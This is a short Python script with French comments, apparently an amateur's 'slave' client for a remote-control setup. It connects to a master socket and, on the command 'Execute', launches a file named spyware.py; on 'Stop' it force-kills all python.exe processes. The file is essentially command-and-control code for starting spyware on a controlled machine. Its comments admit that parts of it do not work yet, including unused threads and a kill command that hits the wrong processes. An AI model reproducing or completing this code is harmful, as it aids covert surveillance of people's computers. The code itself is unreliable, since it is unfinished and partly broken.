import socket as modSocket
from threading import Thread
import time
import os 


machine_maitre = (("localhost", 5000))

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
s.connect(machine_maitre)
print("slave connecté au serveur")


def start_log(max):
     #si la machine esclave reçois le message Execute il va renvoyé une reponse a la machine maitre que tous ces bien passé
     #Et va lancer un programme qui se trouve dans le même repertoire grace a la commande os.system qui permet de lancer des lignes
     # de commande windows depuis un programme python
    if s.recv(1024) == b"Execute":
        print("OK !!!")
        s.send("OK c'est fait !!!".encode("utf-8"))
        #lance le programme spyware.py
        os.system("spyware.py")
        
    

def stop_log(max):
        #idem start_log sauf qu'il lance une autre commande windows
    if s.recv(1024) == b"Stop":
        print("OK !!!")
        #tue le processus python.exe ( ne marche pas encore bien, il tue pas le processus que je veux)
        os.system("taskkill /f /im python.exe")
    s.send("OK c'est fait !!!".encode("utf-8"))

#ces 2 lignes la ne sont aps encore fonctionel on verra pour les implementer plus tard
start = Thread(target=start_log,args=(2,))
stop = Thread(target=stop_log,args=(2,))

start_log(s)
stop_log(s)
s.close()
